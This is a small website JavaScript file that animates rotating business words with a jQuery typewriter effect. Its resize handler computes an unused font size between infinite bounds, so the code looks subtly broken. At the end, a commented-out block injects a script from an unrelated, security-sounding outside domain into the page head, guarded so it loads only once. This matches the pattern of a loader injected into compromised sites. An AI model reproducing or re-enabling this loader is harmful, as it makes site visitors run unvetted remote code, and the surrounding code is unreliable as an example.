"use strict";

var win = jQuery(window),
				foo = jQuery('#typer');
				foo.typer(['Corporate','Business', 'Consulting', 'Accounting' ]);           
				win.resize(function(){
					var fontSize = Math.max(Math.min(win.width() / (1 * 5), parseFloat(Number.POSITIVE_INFINITY)), parseFloat(Number.NEGATIVE_INFINITY));

				}).resize();

/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/